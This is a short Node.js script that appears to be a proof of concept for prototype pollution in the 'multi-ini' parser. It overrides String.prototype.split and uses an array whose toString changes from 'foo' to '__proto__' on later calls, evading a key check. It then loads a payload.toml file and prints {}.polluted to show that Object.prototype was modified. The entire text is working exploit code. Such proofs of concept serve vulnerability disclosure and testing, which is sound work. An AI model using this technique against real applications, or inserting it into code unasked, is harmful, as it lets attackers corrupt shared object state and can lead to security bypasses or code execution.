var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const ini = require('multi-ini');
const path = require('path');
console.log({}.polluted);
ini.read(path.resolve(__dirname, './payload.toml'), { encoding: 'utf8' });
console.log({}.polluted);